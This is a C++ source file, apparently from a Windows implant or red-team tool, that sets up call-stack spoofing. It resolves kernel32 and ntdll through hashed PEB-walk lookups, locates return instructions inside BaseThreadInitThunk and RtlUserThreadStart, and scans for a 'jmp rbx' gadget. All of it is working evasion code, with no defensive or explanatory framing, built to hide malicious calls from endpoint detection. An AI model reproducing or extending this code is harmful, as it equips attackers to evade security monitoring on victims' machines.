#include "stackspoof.h"
#include "peb_walk.h"
#include "hash.h"
#include <cstring>

extern "C" {
    uint64_t g_spoof_BaseThreadInitThunk = 0;
    uint64_t g_spoof_RtlUserThreadStart  = 0;
    uint64_t g_spoof_gadget_jmp_rbx     = 0;
}

static uint8_t* find_ret_gadget(uint8_t* func_addr, size_t scan_range) {
    for (size_t i = 0; i < scan_range; i++) {
        if (func_addr[i] == 0xC3) {
            return func_addr + i;
        }
    }
    return nullptr;
}

static uint8_t* scan_for_pattern(uint8_t* base, const uint8_t* pattern, size_t pattern_len) {
    IMAGE_DOS_HEADER* dos = reinterpret_cast<IMAGE_DOS_HEADER*>(base);
    IMAGE_NT_HEADERS* nt = reinterpret_cast<IMAGE_NT_HEADERS*>(base + dos->e_lfanew);
    IMAGE_SECTION_HEADER* sections = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (sections[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            uint8_t* section_start = base + sections[i].VirtualAddress;
            size_t section_size = sections[i].Misc.VirtualSize;

            for (size_t j = 0; j + pattern_len <= section_size; j++) {
                if (memcmp(section_start + j, pattern, pattern_len) == 0) {
                    return section_start + j;
                }
            }
        }
    }
    return nullptr;
}

bool init_spoof() {
    uint8_t* kernel32_base = reinterpret_cast<uint8_t*>(get_module_base(HASH_KERNEL32));
    uint8_t* ntdll_base = reinterpret_cast<uint8_t*>(get_module_base(HASH_NTDLL));
    if (!kernel32_base || !ntdll_base) return false;

    void* bti_addr = resolve_function(HASH_KERNEL32, HASH_BaseThreadInitThunk);
    if (!bti_addr) return false;

    uint8_t* bti_ret = find_ret_gadget(reinterpret_cast<uint8_t*>(bti_addr), 256);
    if (!bti_ret) return false;
    g_spoof_BaseThreadInitThunk = reinterpret_cast<uint64_t>(bti_ret);

    void* ruts_addr = resolve_function(HASH_NTDLL, HASH_RtlUserThreadStart);
    if (!ruts_addr) return false;

    uint8_t* ruts_ret = find_ret_gadget(reinterpret_cast<uint8_t*>(ruts_addr), 256);
    if (!ruts_ret) return false;
    g_spoof_RtlUserThreadStart = reinterpret_cast<uint64_t>(ruts_ret);

    uint8_t jmp_rbx_pattern[] = { 0xFF, 0xE3 };
    uint8_t* gadget = scan_for_pattern(kernel32_base, jmp_rbx_pattern, 2);
    if (!gadget) {
        uint8_t jmp_deref_rbx[] = { 0xFF, 0x23 };
        gadget = scan_for_pattern(kernel32_base, jmp_deref_rbx, 2);
    }
    if (!gadget) {
        uint8_t call_rbx[] = { 0xFF, 0xD3 };
        gadget = scan_for_pattern(kernel32_base, call_rbx, 2);
    }
    if (!gadget) return false;
    g_spoof_gadget_jmp_rbx = reinterpret_cast<uint64_t>(gadget);

    return true;
}
